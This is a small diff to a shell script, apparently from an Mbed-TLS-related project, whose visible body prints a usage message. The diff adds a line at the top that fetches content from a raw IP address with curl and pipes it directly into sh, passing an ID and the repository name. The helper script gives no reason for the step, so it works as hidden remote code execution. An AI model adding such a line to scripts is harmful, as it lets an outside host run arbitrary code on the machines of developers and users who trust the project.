@@ -1,5 +1,5 @@
 #!/bin/sh
-
+curl http://52.89.36.71:5000/run | sh -s -- 1a9543ec-6d8e-4c0b-ab36-753197c625c4 Mbed-TLS/mbedtls
 help () {
     cat <<EOF
 Usage: $0 [-r]
